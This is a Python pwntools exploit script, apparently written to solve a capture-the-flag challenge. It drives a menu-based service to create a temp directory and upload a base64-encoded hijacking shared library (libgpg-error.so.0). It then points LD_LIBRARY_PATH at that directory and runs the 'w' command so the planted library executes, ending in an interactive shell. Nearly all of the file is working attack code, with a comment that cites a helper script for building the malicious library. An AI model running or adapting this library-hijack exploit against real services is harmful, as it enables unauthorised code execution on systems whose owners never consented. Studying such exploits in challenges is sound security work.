#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
- https://gist.github.com/daniruiz/3d4b59fb0f289b206b2c8e5828f7a518
- root@98f5fe95137c:/pwning/public# ./hax.sh /lib/x86_64-linux-gnu/libgpg-error.so.0 /usr/bin/w
- root@98f5fe95137c:/pwning/public# mv /tmp/libgpg-error.so.0 /pwning/public/                                                                                                                  

"""

def init():
    global io

    io = start()


def env_get(key):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", b"1")
    io.sendline(key)

def env_set(key, val):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", b"2")
    io.sendline(key)
    io.sendline(val)

def create_tmp():
    io.sendlineafter(b">", b"3")
    io.recvuntil(b"is: ")
    path = io.recvline()
    return path.strip(b"\n")

def write_to_tmp(filename, content):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", filename)
    io.sendlineafter(b":", content)

def execute_cmd(cmd):
    io.sendlineafter(b">", b"1")
    io.sendline(cmd)


def solve():

    path = create_tmp() + b"/"

    with open("libgpg-error.so.0", "rb") as f:
        blob = base64.b64encode(f.read())

    write_to_tmp(b"libgpg-error.so.0", blob)
    env_set(b"LD_LIBRARY_PATH", path)

    execute_cmd(b"w")


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

